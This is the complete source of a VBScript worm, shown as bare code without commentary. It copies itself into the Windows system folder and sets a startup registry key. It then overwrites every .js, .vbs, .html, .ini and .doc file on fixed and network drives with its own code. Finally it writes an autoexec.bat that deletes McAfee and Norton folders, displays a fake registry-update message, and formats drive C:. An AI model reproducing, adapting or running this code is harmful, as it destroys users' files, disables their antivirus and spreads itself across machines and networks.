On Error Resume Next
Dim fso,systemdir,file
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
start()
Sub start()
On Error Resume Next
Set systemdir = fso.GetSpecialFolder(1)
Set x = fso.GetFile(WScript.ScriptFullName)
x.Copy(systemdir&"\Wsock32.vbs")
putreg()
listadriv()
batch()
End Sub
Sub putreg()
Dim wscr
Set wscr=CreateObject("WScript.Shell")
wscr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Wsock32",systemdir&"\Wsock32.vbs"
End Sub
Sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
End If
Next
listadriv = s
End Sub
Sub infectfiles(folderspec)
On Error Resume Next
Dim f,f1,fc,ext,ap,s,bname
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="js") or (ext="vbs") or (ext="html") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
elseif(ext="ini") or (ext="doc") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
end if
next
end sub
Sub folderlist(folderspec)			' FOLDERLIST
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
end sub
Sub batch()
On Error Resume Next
set autobat=fso.CreateTextFile("C:\autoexec.bat")
autobat.WriteLine "@echo off"
autobat.WriteLine "prompt $p$g"
autobat.WriteLine " "
autobat.WriteLine "Set Path=C:\Windows;C:\Windows\Command"
autobat.WriteLine "@DELTREE C:\Progra~1\Networ~1\McAfee~1"
autobat.WriteLine "@DELTREE C:\Progra~1\Norton~1"
autobat.WriteLine " "
autobat.WriteLine "CLS"
autobat.WriteLine "echo Please wait...Windows is updating your registry settings..."
autobat.WriteLine "echo This may take several minutes..."
autobat.WriteLine "@FORMAT C: /SELECT /U"
autobat.close
End Sub

